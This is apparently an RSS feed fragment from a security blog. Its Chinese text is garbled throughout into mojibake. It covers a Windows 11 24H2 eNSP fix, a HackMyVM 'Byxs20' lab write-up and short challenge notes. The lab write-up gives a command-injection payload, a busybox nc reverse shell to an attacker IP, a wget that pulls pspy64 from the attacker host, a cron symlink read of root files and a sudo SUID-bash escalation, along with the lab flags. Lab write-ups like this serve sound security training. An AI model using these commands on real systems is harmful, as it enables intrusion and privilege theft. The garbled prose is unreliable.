ËÆ∏Â§öÁî®Êà∑Âú®Â∞Ü Windows 11 Êìç‰ΩúÁ≥ªÁªüÂçáÁ∫ßÂà∞ **Version 24H2** ÂêéÔºåÈÅáÂà∞‰∫ÜÂçé‰∏∫ÁΩëÁªúÊ®°ÊãüÂπ≥Âè∞ eNSP Êó†Ê≥ïÊ≠£Â∏∏Â∑•‰ΩúÁöÑÈóÆÈ¢ò„ÄÇÂÖ∑‰ΩìË°®Áé∞ÈÄöÂ∏∏‰∏∫ÂêØÂä® AR Ë∑ØÁî±Âô®Á≠âËÆæÂ§áÊó∂Â§±Ë¥•ÔºåÂπ∂ÂèØËÉΩ‰º¥Èöè **ÈîôËØØ‰ª£Á†Å 40 (Error Code 40)** ÁöÑÊèêÁ§∫„ÄÇËøôÁªô‰æùËµñ eNSP ËøõË°åÂ≠¶‰π†ÂíåÂÆûÈ™åÁöÑÁî®Êà∑Â∏¶Êù•‰∫Ü‰∏ç‰æø„ÄÇ

## Ëß£ÂÜ≥ÊñπÊ°àÔºöÂÆòÊñπË°•‰∏Å KB5053656

Â•ΩÊ∂àÊÅØÊòØÔºåÂæÆËΩØÂÆòÊñπÂ∑≤ÁªèÊÑèËØÜÂà∞‰∫ÜËøô‰∏™ÈóÆÈ¢òÔºåÂπ∂ÂèëÂ∏É‰∫ÜÁõ∏Â∫îÁöÑ‰øÆÂ§çË°•‰∏Å„ÄÇÊ†πÊçÆÊúÄÊñ∞‰ø°ÊÅØÔºàÊõ¥Êñ∞‰∫é 20250408 Â∑¶Âè≥ÔºâÔºåWindows Êõ¥Êñ∞ **KB5053656** Â∑≤ÁªèËß£ÂÜ≥‰∫Ü eNSP Âú® Windows 11 24H2 ‰∏äÁöÑÂÖºÂÆπÊÄßÈóÆÈ¢ò„ÄÇ

Ê≠§Êõ¥Êñ∞ÂåÖÂê´‰∫ÜÂ§öÈ°πÊñ∞ÂäüËÉΩ„ÄÅÂäüËÉΩ‰ºòÂåñÂíåÈóÆÈ¢ò‰øÆÂ§çÔºåÂÖ∂‰∏≠Â∞±ÂåÖÊã¨‰∫ÜÂØπÂØºËá¥ eNSP ÂºÇÂ∏∏ÁöÑÂ∫ïÂ±ÇÈóÆÈ¢òÁöÑ‰øÆÊ≠£„ÄÇËØ•Ë°•‰∏ÅÈÄÇÁî®‰∫é **Windows 11 ÂÆ∂Â∫≠Áâà„ÄÅ‰∏ì‰∏öÁâàÂíå‰∏ì‰∏öÂ∑•‰ΩúÁ´ôÁâà**„ÄÇ

## Â¶Ç‰ΩïËé∑ÂèñÂπ∂ÂÆâË£Ö‰øÆÂ§çË°•‰∏Å

ËØ∑ÊåâÁÖß‰ª•‰∏ãÊ≠•È™§Êìç‰ΩúÔºå‰ª•Á°Æ‰øùÊÇ®ÁöÑÁ≥ªÁªüÂÆâË£Ö‰∫ÜÂøÖË¶ÅÁöÑÊõ¥Êñ∞Ôºö

1.  **ÊâìÂºÄ Windows Êõ¥Êñ∞Ôºö**
    *   ÁÇπÂáª ‚ÄúÂºÄÂßã‚Äù ËèúÂçïÔºåÈÄâÊã© ‚ÄúËÆæÁΩÆ‚Äù„ÄÇ
    *   Âú® ‚ÄúËÆæÁΩÆ‚Äù Á™óÂè£‰∏≠ÔºåÂØºËà™Ëá≥ ‚ÄúWindows Êõ¥Êñ∞‚Äù„ÄÇ

2.  **Ê£ÄÊü•Âπ∂Ëé∑ÂèñÊõ¥Êñ∞Ôºö**
    *   ÁÇπÂáª **‚ÄúÊ£ÄÊü•Êõ¥Êñ∞‚Äù** Êàñ **‚ÄúËé∑ÂèñÊõ¥Êñ∞‚Äù** ÊåâÈíÆ„ÄÇ
    *   Á≥ªÁªüÂ∞ÜÂºÄÂßãÊü•ÊâæÂèØÁî®ÁöÑÊõ¥Êñ∞„ÄÇÂ¶ÇÊûúÊÇ®Â∑≤ÁªèÂçáÁ∫ßÂà∞ Win11 24H2ÔºåÂèØËÉΩ‰ºöÁúãÂà∞Â§ö‰∏™ÂæÖÂÆâË£ÖÁöÑÊõ¥Êñ∞„ÄÇ
    *   ËØ∑ÈáçÁÇπÂÖ≥Ê≥®Âπ∂Á°Æ‰øùÂÆâË£ÖÂêç‰∏∫ **‚Äú2025-ÈÄÇÁî®‰∫é Windows 11 Version 24H2 ÁöÑ 03 Á¥ØÁßØÊõ¥Êñ∞ÔºåÈÄÇÂêàÂü∫‰∫é x64 ÁöÑÁ≥ªÁªü (KB5053656)‚Äù** ÁöÑË°•‰∏Å„ÄÇ
    *   *Ê≥®ÊÑèÔºöÊõ¥Êñ∞ÂêçÁß∞‰∏≠ÁöÑ '2025-...' ÂèØËÉΩ‰∏éÂèëÂ∏ÉÊó∂Èó¥Áõ∏ÂÖ≥ÔºåÂÖ≥ÈîÆÊòØËØÜÂà´ **KB5053656** Ëøô‰∏™ÁºñÂè∑„ÄÇ*

3.  **ÂÆâË£ÖÂπ∂ÈáçÂêØÔºö**
    *   ËÆ© Windows ‰∏ãËΩΩÂπ∂ÂÆâË£ÖÊâÄÊúâÈÄâÂÆöÁöÑÊõ¥Êñ∞ÔºåÂåÖÊã¨ KB5053656„ÄÇ
    *   ÂÆâË£ÖÂÆåÊàêÂêéÔºåÊ†πÊçÆÁ≥ªÁªüÊèêÁ§∫ **ÈáçÂêØÊÇ®ÁöÑËÆ°ÁÆóÊú∫** ‰ª•‰ΩøÊõ¥Êñ∞ÁîüÊïà„ÄÇ

## È™åËØÅ‰øÆÂ§çÁªìÊûú

ÊàêÂäüÂÆâË£Ö KB5053656 Êõ¥Êñ∞Âπ∂ÈáçÂêØËÆ°ÁÆóÊú∫ÂêéÔºö

1.  ÂêØÂä® eNSP Â∫îÁî®Á®ãÂ∫è„ÄÇ
2.  Â∞ùËØïÊñ∞Âª∫‰∏Ä‰∏™ÊãìÊâëÔºåÂπ∂Ê∑ªÂä†‰∏Ä‰∏™ AR Ë∑ØÁî±Âô®ÊàñÂÖ∂‰ªñ‰πãÂâçÊó†Ê≥ïÂêØÂä®ÁöÑËÆæÂ§á„ÄÇ
3.  ÂêØÂä®ËØ•ËÆæÂ§á„ÄÇ
4.  Â¶ÇÊûúËÆæÂ§áËÉΩÂ§üÊàêÂäüÂêØÂä®Âπ∂ËøõÂÖ•ÂëΩ‰ª§Ë°åÁïåÈù¢ÔºåÂàôË°®Á§∫ÈóÆÈ¢òÂ∑≤Ëß£ÂÜ≥„ÄÇ

## ÂÆâË£ÖÊõ¥Êñ∞Âêé‰ªçÈÅáÈîôËØØ‰ª£Á†Å 40Ôºü

Â¶ÇÊûúÂú®ÂÆâË£Ö‰∫Ü KB5053656 Ë°•‰∏Å‰πãÂêéÔºåÂêØÂä® AR ËÆæÂ§áÊó∂ **‰ªçÁÑ∂** ÈÅáÂà∞ÈîôËØØ‰ª£Á†Å 40ÔºåÈÇ£‰πàËøôÂæàÂèØËÉΩ‰∏çÂÜçÊòØÁî±‰∫é Windows 11 24H2 ÁöÑÂÖºÂÆπÊÄßÈóÆÈ¢òÂºïËµ∑ÁöÑ„ÄÇÊ≠§Êó∂ÔºåÊÇ®Â∫îËØ•ÊåâÁÖß **Ëß£ÂÜ≥ eNSP ÈîôËØØ‰ª£Á†Å 40 ÁöÑÂ∏∏ËßÑÊñπÊ≥ï** ËøõË°åÊéíÊü•ÔºåÂ∏∏ËßÅÂéüÂõ†ÂíåËß£ÂÜ≥ÊñπÊ≥ïÂåÖÊã¨Ôºö

*   Ê£ÄÊü• VirtualBox ÁöÑÁâàÊú¨ÊòØÂê¶‰∏é eNSP ÂÖºÂÆπ„ÄÇ
*   Á°Æ‰øù VirtualBox ÁöÑÁΩëÁªúÈÄÇÈÖçÂô®ËÆæÁΩÆÊ≠£Á°Æ„ÄÇ
*   Ê£ÄÊü• Windows Èò≤ÁÅ´Â¢ôÊàñÁ¨¨‰∏âÊñπÂÆâÂÖ®ËΩØ‰ª∂ÊòØÂê¶ÈòªÊ≠¢‰∫Ü eNSP Êàñ VirtualBox ÁöÑÈÄö‰ø°„ÄÇ
*   Â∞ùËØïÈáçÊñ∞Ê≥®ÂÜå AR ËÆæÂ§á„ÄÇ
*   ‰ª•ÁÆ°ÁêÜÂëòÊùÉÈôêËøêË°å eNSP„ÄÇ

## ÁªìËÆ∫

Windows 11 Version 24H2 ‰∏é eNSP ÁöÑÂÖºÂÆπÊÄßÈóÆÈ¢òÁé∞Â∑≤ÈÄöËøáÂæÆËΩØÂÆòÊñπÂèëÂ∏ÉÁöÑ **KB5053656** Êõ¥Êñ∞ÂæóÂà∞**ÂÆåÂÖ®Ëß£ÂÜ≥**„ÄÇÈÅáÂà∞Ê≠§ÈóÆÈ¢òÁöÑÁî®Êà∑Â∫îÂ∞ΩÂø´ÈÄöËøá Windows Update ÂÆâË£ÖÊ≠§Ë°•‰∏ÅÔºå‰ª•ÊÅ¢Â§ç eNSP ÁöÑÊ≠£Â∏∏‰ΩøÁî®„ÄÇÂ¶ÇÊûúÂÆâË£ÖË°•‰∏ÅÂêé‰ªçÊúâÈóÆÈ¢òÔºåËØ∑ËΩ¨ÂêëÊéíÊü• eNSP Êú¨Ë∫´ÊàñÂÖ∂‰æùËµñÁéØÂ¢ÉÔºàÂ¶Ç VirtualBoxÔºâÁöÑÂ∏∏ËßÅÈÖçÁΩÆÈóÆÈ¢ò„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/eNSP%20-zai-%20Windows%2011%2024H2%20-shang-de-jian-rong-xing-wen-ti-yi-tong-guo-%20KB5053656%20-geng-xin-jie-jue.html</guid><pubDate>Fri, 27 Jun 2025 09:32:21 +0000</pubDate></item><item><title>Byxs20Èù∂Êú∫Ê∏óÈÄèÊµãËØïÊä•Âëä (Write-Up)</title><link>https://7r1UMPHK.github.io/post/Byxs20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-Up%29.html</link><description>*   **Èù∂Êú∫ÂêçÁß∞:** Byxs20 (ÂÜÖÈÉ®ÊµãËØï - ÂèØËÉΩÂèëÂ∏É‰∫é HackMyVm)
*   **ÈöæÂ∫¶:** ÁÆÄÂçï (Easy)
*   **ÁõÆÊ†á:** Ëé∑Âèñ user.txt Âíå root.txt Êñá‰ª∂‰∏≠ÁöÑ flag„ÄÇ
*   **ÂÖ≥ÈîÆÁÇπ:** Web ÂëΩ‰ª§Ê≥®ÂÖ•„ÄÅCron ‰ªªÂä°Âà©Áî®„ÄÅSudo ÊèêÊùÉ

---

## 1. ‰ø°ÊÅØÊî∂ÈõÜ (Enumeration)

ÂàùÂßãÈò∂ÊÆµÁöÑÁõÆÊ†áÊòØÂ∞ΩÂèØËÉΩÂ§öÂú∞‰∫ÜËß£ÁõÆÊ†áÁ≥ªÁªü„ÄÇ

* **ÁΩëÁªúÂèëÁé∞ (arp-scan):**
  ‰ΩøÁî® `arp-scan` Êâ´ÊèèÊú¨Âú∞ÁΩëÁªúÔºåÂèëÁé∞ÁõÆÊ†áÈù∂Êú∫ÁöÑ IP Âú∞ÂùÄ„ÄÇ

  ```bash
  sudo arp-scan -l
  ```

  ÈîÅÂÆöÁõÆÊ†á IP ‰∏∫ `192.168.205.194`„ÄÇ

* **Á´ØÂè£Êâ´Êèè (nmap):**
  ÂØπÁõÆÊ†á IP ËøõË°åÂÖ®Á´ØÂè£ TCP Êâ´ÊèèÔºåËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

  ```bash
  nmap -p- 192.168.205.194
  ```

  ÂèëÁé∞ÂºÄÊîæ‰∫Ü‰∏§‰∏™ÂÖ≥ÈîÆÁ´ØÂè£Ôºö

  *   `22/tcp`: SSH ÊúçÂä°
  *   `80/tcp`: HTTP ÊúçÂä° (Web ÊúçÂä°Âô®)

* **Web ÂÜÖÂÆπÂèëÁé∞ (gobuster):**
  ÈíàÂØπ 80 Á´ØÂè£ÁöÑ Web ÊúçÂä°ËøõË°åÁõÆÂΩïÂíåÊñá‰ª∂Êûö‰∏æ„ÄÇ

  ```bash
  gobuster dir -u http://192.168.205.194 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,md,html,zip,bak
  ```

  ÂèëÁé∞‰ª•‰∏ãÂÄºÂæóÂÖ≥Ê≥®ÁöÑË∑ØÂæÑÂíåÊñá‰ª∂Ôºö

  *   `/index.html`: ÁΩëÁ´ôÈ¶ñÈ°µ„ÄÇ
  *   `/templates/`: Â≠òÂú®ÁõÆÂΩïÂàóË°®ÔºåÂåÖÂê´ `about.html`, `contact.html`, `home.html` Á≠âÊ®°ÊùøÊñá‰ª∂„ÄÇ
  *   `/template.php`: ‰∏Ä‰∏™ PHP ËÑöÊú¨Ôºå‰ºº‰πéÁî®‰∫éÂä†ËΩΩÊ®°Êùø„ÄÇ
  *   `/conf/`: ÂêåÊ†∑Â≠òÂú®ÁõÆÂΩïÂàóË°®ÔºåÂèØËÉΩÂ≠òÊîæÈÖçÁΩÆÊñá‰ª∂„ÄÇ
  *   `/ping.php`: Âè¶‰∏Ä‰∏™ PHP ËÑöÊú¨ÔºåÂêçÂ≠óÊöóÁ§∫ÂÖ∂ÂäüËÉΩ‰∏éÁΩëÁªú ping Áõ∏ÂÖ≥„ÄÇ

## 2. Ëé∑ÂèñÂàùÊ≠•Á´ãË∂≥ÁÇπ (www-data ÊùÉÈôê)

* **ÂàÜÊûê Web ÂäüËÉΩ:**

  *   Â∞ùËØïËÆøÈóÆ `/template.php`ÔºåÂèëÁé∞ÂèØ‰ª•ÈÄöËøá `?page=` ÂèÇÊï∞Âä†ËΩΩ `/templates/` ÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂ÔºàÂ¶Ç `?page=about` ‰ºöÂåÖÂê´ `about.php`Ôºâ„ÄÇËøôÊöóÁ§∫Â≠òÂú® LFI (Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´) ÊºèÊ¥û„ÄÇ
  *   Ëøõ‰∏ÄÊ≠•ÊµãËØï LFIÔºåÂ∞ùËØïËØªÂèñ `/etc/passwd` (`?page=../../../../etc/passwd`) Â§±Ë¥•„ÄÇÈîôËØØ‰ø°ÊÅØÊòæÁ§∫ËÑöÊú¨Âú®Ë∑ØÂæÑÊú´Â∞æÂº∫Âà∂Ê∑ªÂä†‰∫Ü `.php` ÂêéÁºÄ„ÄÇ
  *   **ÈáçË¶ÅÂèëÁé∞:** Â∞ùËØïÂåÖÂê´ËÑöÊú¨Ëá™Ë∫´ (`?page=../template`) ‰πüÂ§±Ë¥•‰∫ÜÔºåÂπ∂ËøîÂõû `No such file or directory`„ÄÇËøôÂº∫ÁÉàÊöóÁ§∫ PHP ÈÖçÁΩÆ‰∫Ü `open_basedir`ÔºåÈôêÂà∂‰∫ÜÊñá‰ª∂ÂåÖÂê´ÁöÑËåÉÂõ¥Ôºå‰ΩøÂæóËøô‰∏™ LFI ÊºèÊ¥ûÈöæ‰ª•Áõ¥Êé•Âà©Áî®Êù•ËØªÂèñÊïèÊÑüÊñá‰ª∂„ÄÇ

* **Êé¢Á¥¢ `ping.php`:**

  *   Áõ¥Êé•ËÆøÈóÆ `ping.php` ËøîÂõû 'Invalid IP!'„ÄÇ
  *   ‰ΩøÁî® `ip` ÂèÇÊï∞ (`ping.php?ip=127.0.0.1`) ÂèØ‰ª•ÊàêÂäüÊâßË°å ping ÂëΩ‰ª§„ÄÇ

* **ÂèëÁé∞ÈöêËóèÂèÇÊï∞ (wfuzz):**
  ‰ΩøÁî® `wfuzz` ÂØπ `ping.php` ËøõË°åÂèÇÊï∞ FuzzingÔºåÂØªÊâæÈô§ `ip` ‰πãÂ§ñÁöÑÂÖ∂‰ªñÂèÇÊï∞„ÄÇ

  ```bash
  wfuzz -u 'http://192.168.205.194/ping.php?FUZZ=127.0.0.1' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 2
  ```

  ÂèëÁé∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `debug` ÁöÑÂèÇÊï∞„ÄÇ

* **ÂëΩ‰ª§Ê≥®ÂÖ• (Command Injection):**
  **Ê†∏ÂøÉÂèëÁé∞Ôºö** ÂçïÁã¨‰ΩøÁî® `ip` ÂèÇÊï∞Âè™ËÉΩÊâßË°å pingÔºåÂçïÁã¨‰ΩøÁî® `debug` ÂèÇÊï∞ÔºàÂ¶ÇÊûúÊúâÊïàÔºâ‰πüÊó†Ê≥ïÁõ¥Êé• RCE„ÄÇ**ÂøÖÈ°ªÂ∞Ü `ip` Âíå `debug` ÂèÇÊï∞ÁªìÂêàËµ∑Êù•**ÔºåÊâçËÉΩËß¶ÂèëÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û„ÄÇ
  ÊµãËØïÂëΩ‰ª§Ê≥®ÂÖ•Ôºö‰ΩøÁî® `%0A` (URL ÁºñÁ†ÅÁöÑÊç¢Ë°åÁ¨¶) Âú® `ip` ÂèÇÊï∞‰∏≠ÈôÑÂä† `id` ÂëΩ‰ª§ÔºåÂπ∂ÂêåÊó∂Âä†‰∏ä `debug=1` ÂèÇÊï∞„ÄÇ

  ```bash
  curl 'http://192.168.205.194/ping.php?ip=127.0.0.1%0Aid&amp;debug=1'
  ```

  ËøîÂõûÁöÑËæìÂá∫ÂåÖÂê´‰∫Ü `[*] Debug Mode Activated`„ÄÅ`[+] Raw Command: ping -c 3 127.0.0.1\nid` ‰ª•Âèä `id` ÂëΩ‰ª§ÁöÑÊâßË°åÁªìÊûú (`uid=33(www-data)...`)ÔºåÁ°ÆËÆ§‰∫ÜÂëΩ‰ª§Ê≥®ÂÖ•ÔºÅ

* **Ëé∑ÂèñÂèçÂºπ Shell (Reverse Shell):**
  Âà©Áî®Ëøô‰∏™ÂëΩ‰ª§Ê≥®ÂÖ•ÁÇπËé∑ÂèñÂèçÂêë Shell„ÄÇ

  1. Âú®ÊîªÂáªÊú∫‰∏äËÆæÁΩÆ Netcat ÁõëÂê¨Ôºö

     ```bash
     nc -lvnp 8888
     ```

  2. ÊûÑÈÄ†Âπ∂ÂèëÈÄÅÂèçÂºπ Shell ÁöÑ payload„ÄÇ‰ΩøÁî® `busybox nc` ÊèêÈ´òÂÖºÂÆπÊÄßÔºåÂπ∂ÂØπ payload ËøõË°å URL ÁºñÁ†Å„ÄÇ

     ```bash
     # Payload: busybox nc [‰Ω†ÁöÑÊîªÂáªÊú∫IP] 8888 -e /bin/bash
     # URL ÁºñÁ†ÅÂêé: busybox%20nc%20[‰Ω†ÁöÑÊîªÂáªÊú∫IP]%208888%20-e%20%2Fbin%2Fbash
     curl 'http://192.168.205.194/ping.php?ip=127.0.0.1%0Abusybox%20nc%20[‰Ω†ÁöÑÊîªÂáªÊú∫IP]%208888%20-e%20%2Fbin%2Fbash&amp;debug=1'
     ```

     Â∞Ü `[‰Ω†ÁöÑÊîªÂáªÊú∫IP]` ÊõøÊç¢‰∏∫‰Ω†ÁöÑ IP„ÄÇÊâßË°åÂêéÔºå`nc` ÁõëÂê¨Á´ØÂ∫îÊî∂Âà∞ËøûÊé•„ÄÇ

* **ÂçáÁ∫ß Shell:**
  ‰∏∫‰∫ÜÊõ¥Â•ΩÁöÑ‰∫§‰∫í‰ΩìÈ™åÔºåÂ∞ÜËé∑ÂèñÂà∞ÁöÑÂü∫Á°Ä Shell ÂçáÁ∫ß‰∏∫Ê†áÂáÜÁöÑ TTY„ÄÇ

  ```bash
  # Âú®ÂèçÂºπ Shell ‰∏≠
  script /dev/null -c bash
  # Êåâ Ctrl+Z
  # Âú®ÊîªÂáªÊú∫ÁªàÁ´Ø
  stty raw -echo; fg
  # Êåâ‰∏§Ê¨° Enter
  # ÂõûÂà∞ÂèçÂºπ Shell
  reset xterm
  export TERM=xterm
  export SHELL=/bin/bash
  stty rows 40 columns 178 # Ê†πÊçÆÂÆûÈôÖÁªàÁ´ØË∞ÉÊï¥
  ```

  Áé∞Âú®‰Ω†Êã•Êúâ‰∫Ü‰∏Ä‰∏™Á®≥ÂÆöÁöÑ `www-data` ÊùÉÈôê Shell„ÄÇ

## 3. ÊùÉÈôêÊèêÂçá (Privilege Escalation)

* **ËøõÁ®ãÁõëÊéß‰∏é Cron ‰ªªÂä°ÂèëÁé∞ (pspy):**
  ‰∏ä‰º†Âπ∂ËøêË°å `pspy64` Â∑•ÂÖ∑Êù•ÁõëÊéßÁ≥ªÁªüËøõÁ®ãÔºåÂØªÊâæÊèêÊùÉÊú∫‰ºö„ÄÇ

  1. Âú®ÊîªÂáªÊú∫‰∏äÂºÄÂêØ HTTP ÊúçÂä°‰ª•Êèê‰æõ `pspy64`„ÄÇ

  2. Âú®ÁõÆÊ†áÊú∫ `/tmp` ÁõÆÂΩï‰∏ã‰∏ãËΩΩÂπ∂ËøêË°å `pspy64`„ÄÇ

     ```bash
     # Âú®ÁõÆÊ†áÊú∫ www-data Shell ‰∏≠
     cd /tmp
     busybox wget http://[‰Ω†ÁöÑÊîªÂáªÊú∫IP]/pspy64
     chmod +x pspy64
     ./pspy64
     ```

     `pspy64` ÁöÑËæìÂá∫Êè≠Á§∫‰∫Ü‰∏Ä‰∏™‰ª• root ÊùÉÈôê (`UID=0`) ÂÆöÊúüÊâßË°åÁöÑ Cron ‰ªªÂä°Ôºö

  ```
  2025/04/20 09:42:01 CMD: UID=0 PID=658 | /bin/sh -c cp /var/www/html/conf/apache2.conf.bak /etc/apache2/apache2.conf
  ```

  Ëøô‰∏™‰ªªÂä°ÊØèÂàÜÈíü‰ºöÂ∞Ü `/var/www/html/conf/apache2.conf.bak` Ë¶ÜÁõñÂà∞ `/etc/apache2/apache2.conf`„ÄÇÁî±‰∫é `www-data` Áî®Êà∑ÈÄöÂ∏∏ÂØπ `/var/www/html/conf` ÁõÆÂΩïÊúâÂÜôÊùÉÈôêÔºåËøôÊàê‰∏∫‰∫ÜÊèêÊùÉÁöÑÂÖ≥ÈîÆ„ÄÇ

* **ÊèêÊùÉÊñπÊ≥ï 1: Cron + Á¨¶Âè∑ÈìæÊé•‰ªªÊÑèÊñá‰ª∂ËØªÂèñ**
  Âà©Áî® Cron ‰ªªÂä°Ë¶ÜÁõñÊñá‰ª∂ÁöÑË°å‰∏∫ÔºåÈÄöËøáÂàõÂª∫Á¨¶Âè∑ÈìæÊé•Êù•ËØªÂèñ‰ªªÊÑèÊñá‰ª∂„ÄÇ

  1. **ËØªÂèñ user flag:** Â∞Ü `apache2.conf.bak` ÈìæÊé•Âà∞ `user.txt`„ÄÇ

     ```bash
     cd /var/www/html/conf
     ln -sf /home/welcome/user.txt apache2.conf.bak
     ```

  2. Á≠âÂæÖ Cron ‰ªªÂä°ÊâßË°åÔºàÊúÄÂ§ö 1 ÂàÜÈíüÔºâ„ÄÇ

  3. ËØªÂèñË¢´Ë¶ÜÁõñÂêéÁöÑ Apache ÈÖçÁΩÆÊñá‰ª∂ÔºåÂç≥ÂæóÂà∞ `user.txt` ÁöÑÂÜÖÂÆπ„ÄÇ

     ```bash
     cat /etc/apache2/apache2.conf
     # -&gt; flag{user-05659dca555d4ddbc396b319645f3d2a}
     ```

  4. **ËØªÂèñ root flag:** Âà†Èô§ÊóßÈìæÊé•ÔºåÂàõÂª∫Êñ∞ÈìæÊé•ÊåáÂêë `root.txt`„ÄÇ

     ```bash
     rm apache2.conf.bak
     touch apache2.conf.bak
     ln -sf /root/root.txt apache2.conf.bak
     ```

  5. ÂÜçÊ¨°Á≠âÂæÖ Cron ‰ªªÂä°ÊâßË°å„ÄÇ

  6. ËØªÂèñ Apache ÈÖçÁΩÆÊñá‰ª∂ÂæóÂà∞ `root.txt` ÁöÑÂÜÖÂÆπ„ÄÇ

     ```bash
     cat /etc/apache2/apache2.conf
     # -&gt; flag{root-f9ef88715e3bbec612f9f88d64ae3a99}
     ```

* **ÊèêÊùÉÊñπÊ≥ï 2: Cron ‰øÆÊîπÈÖçÁΩÆ + Áî®Êà∑ÂàáÊç¢ + Sudo ÊèêÊùÉ**
  ËøôÊòØ‰∏Ä‰∏™Êõ¥Êõ≤Êäò‰ΩÜÂêåÊ†∑ÊúâÊïàÁöÑÊñπÊ≥ï„ÄÇ

  1. **‰øÆÊîπ Apache ÈÖçÁΩÆ:** Âà©Áî® Cron ‰ªªÂä°Ôºå‰øÆÊîπ Apache ÁöÑËøêË°åÁî®Êà∑‰∏∫ `welcome`„ÄÇ

     ```bash
     cd /var/www/html/conf
     nano apache2.conf.bak
     User welcome
     Group welcome
     ```

  2. Á≠âÂæÖ Cron ÊâßË°åÔºåÂπ∂ËÆ© Apache ÊúçÂä°‰ª•Êñ∞Áî®Êà∑Ë∫´‰ªΩËøêË°åÔºàÂèØ‰ª•Áõ¥Êé•`sudo /usr/sbin/reboot`Ôºâ„ÄÇ

  3. **Ëé∑Âèñ `welcome` Shell:** ÂÜçÊ¨°‰ΩøÁî®‰πãÂâçÁöÑÂëΩ‰ª§Ê≥®ÂÖ•Ëé∑ÂèñÂèçÂºπ Shell„ÄÇËøûÊé•ÂêéÁ°ÆËÆ§Áî®Êà∑Ë∫´‰ªΩ„ÄÇ

     ```bash
     # ... Ëé∑ÂèñÂèçÂºπ Shell ...
     id
     # Â∫îÊòæÁ§∫ uid=1000(welcome) ...
     ```

  4. **Ê£ÄÊü• Sudo ÊùÉÈôê:** ‰Ωú‰∏∫ `welcome` Áî®Êà∑ÔºåÊü•ÁúãÂÖ∂ `sudo` ÊùÉÈôê„ÄÇ

     ```bash
     sudo -l
     ```

     ÂèëÁé∞ `welcome` ÂèØ‰ª•Êó†ÂØÜÁ†ÅÊâßË°å `/home/welcome/test/test`„ÄÇ

  5. **Âà©Áî® Sudo ËßÑÂàô:** Áî±‰∫é `welcome` ÂèØ‰ª•ÊéßÂà∂ `test/test` ËÑöÊú¨ÁöÑÂÜÖÂÆπÔºåÂèØ‰ª•ÊûÑÈÄ†ÊÅ∂ÊÑèËÑöÊú¨„ÄÇ

  6. ÂàõÂª∫ËÑöÊú¨ÔºåËµã‰∫à `/bin/bash` SUID ÊùÉÈôê„ÄÇ

     ```bash
     mv /home/welcome/test /home/welcome/test1
     mkdir /home/welcome/test
     echo '#!/bin/bash' &gt; /home/welcome/test/test
     echo 'chmod u+s /bin/bash' &gt;&gt; /home/welcome/test/test
     chmod +x /home/welcome/test/test
     ```

  7. ÈÄöËøá `sudo` ÊâßË°åËØ•ËÑöÊú¨„ÄÇ

     ```bash
     sudo /home/welcome/test/test
     ```

  8. **Ëé∑Âèñ Root:** ÊâßË°åÂ∏¶Êúâ SUID ÊùÉÈôêÁöÑ `bash`„ÄÇ

     ```bash
     bash -p
     id
     # Â∫îÊòæÁ§∫ euid=0(root)
     ```

     ÊàêÂäüËé∑Âèñ root ÊùÉÈôê„ÄÇ

## 4. Ëé∑Âèñ Flag

*   **User Flag:** `flag{user-05659dca555d4ddbc396b319645f3d2a}` (‰Ωç‰∫é `/home/welcome/user.txt`)
*   **Root Flag:** `flag{root-f9ef88715e3bbec612f9f88d64ae3a99}` (‰Ωç‰∫é `/root/root.txt`)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Byxs20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-Up%29.html</guid><pubDate>Fri, 27 Jun 2025 09:32:18 +0000</pubDate></item><item><title>Challenge 012</title><link>https://7r1UMPHK.github.io/post/Challenge%20012.html</link><description># Challenge 012

# Challenge 012

**ÊåëÊàòÈìæÊé•:** https://hackmyvm.eu/challenges/challenge.php?c=012

![ÊåëÊàòÂõæÁâá](https://7r1umphk.github.io/image/20250518110545680.webp)

## 1. ÂàùÊ≠•ÂàÜÊûê

‰∏ãËΩΩÊñá‰ª∂

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 012.zip 012.mp3 
-rwxr-xr-x 1 kali kali 17286 Mar  6  2022 012.mp3
-rwxr-xr-x 1 kali kali 16978 May 17 23:06 012.zip
```
È¶ñÂÖàÂ∞ùËØïÁõ¥Êé•Ëß£Âéã `012.zip` Êñá‰ª∂ÔºåËß£ÂéãÂá∫`012.mp3`
### 2 Èü≥È¢ëÂÜÖÂÆπÂàÜÊûê

ÈÄöËøáÊí≠Êîæ `012.mp3` Êñá‰ª∂Âπ∂‰ªîÁªÜÂê¨ÂèñÂÖ∂ÂÜÖÂÆπ„ÄÇÈü≥È¢ë‰∏≠ËØ¥Âá∫ÁöÑËã±ÊñáÁü≠ËØ≠ÊòØÔºö

'I love languages'

## 4. Flag

ÊúÄÁªàÁöÑ Flag ÊòØÔºö

```
HMV{Ilovelanguages}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20012.html</guid><pubDate>Fri, 27 Jun 2025 09:32:15 +0000</pubDate></item><item><title>Challenge 010</title><link>https://7r1UMPHK.github.io/post/Challenge%20010.html</link><description># 1. ÂàùÊ≠•ÂàÜÊûê

**ÊåëÊàòÈìæÊé•:** https://hackmyvm.eu/challenges/challenge.php?c=010

![ÊåëÊàòÂõæÁâá](https://7r1umphk.github.io/image/20250518105910057.webp)

## 1. ÂàùÊ≠•ÂàÜÊûê

ÊåëÊàòÈ°µÈù¢Áõ¥Êé•ÊòæÁ§∫‰∫Ü‰∏Ä‰∏≤ÁúãËµ∑Êù•ÁªèËøáÁºñÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤Ôºö

```
853-3GB.eOG[ko/A7oS$FF=
```

